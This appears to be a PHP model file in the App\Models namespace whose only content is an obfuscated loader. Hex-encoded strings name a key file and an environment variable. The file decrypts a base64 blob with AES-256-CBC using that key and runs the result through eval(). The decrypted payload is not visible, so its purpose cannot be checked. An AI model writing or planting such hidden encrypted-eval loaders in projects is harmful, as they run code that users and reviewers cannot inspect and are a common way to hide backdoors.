<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jg5CGLMzKDUzWBz713mZAw==');

$c=base64_decode(

'0JYgDL2qwCaZWFAe1e4y1QuON2NBG3klOKEwNIzk4ScvBy3dUJutjp/JdQgvTSeFL1Fqo7H78keR' .
'+zlEpq+/2WMMdQuwlZJbuXo5BsHp4LZ61O1rs+GRP1zAxPh3DDul5S09LLBV2kTOwWcyakXLBiPL' .
'MSQW/y0HczU/tvUEYjSgIw5XgqrZBp/dKsvcPSqx6VuxjIGMXzKdjZtiaYgRtS5c8PqybeaXNKLc' .
'861YOPXd6AkitEJTtUOmdNyUKNTpqlpfuvvFi96xyIENJTXEH6OcxoTqejB4fdqEh1HCkRgBqTlp' .
'Hqs2Gf0NMLI68esnRjez+pLCUchii0qYckqZJjlPzcy7wz41SnVsnQAnnemUmVl+84mRhjlwCncr' .
'oSn7X7k9n/bepsDphu7IjC8ufbjNWkjIEc9NufguvGkq2P7g/5OhqaI4sF4oY4DVJ6dgL9J2Us7P' .
'gryVH2qv8ZmzRZKXuA1JSSdtdmrljE+5bHuNQ9ul2kUr7xufF21sndV/ez4Qw0kBa43w9S8xsuno' .
'hWkSjlLAncgVFeaAvh3DudsTmPr8AFkvRNgRF0ouNKzsxEIbIVgtGD9oZiWH2VW+GDQxIx+PIbI1' .
'827KdT8SfXWCLjNXYw0+gtKerCoJTsUSvB7UMEnvd7Cj9jH1KPRnqhkJQVbcXL4pMp5B5rGgs/c5' .
'fJx+rm9Z85ABaXsYqI8Oae4MI6gLRttUv+17eE73Y7vw9+cSiwOD2CutC1nZOlQ5x6Xm+pReRQgq' .
'OSQ6C/7Owxw41GJ12mlMGjoIvFfboA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

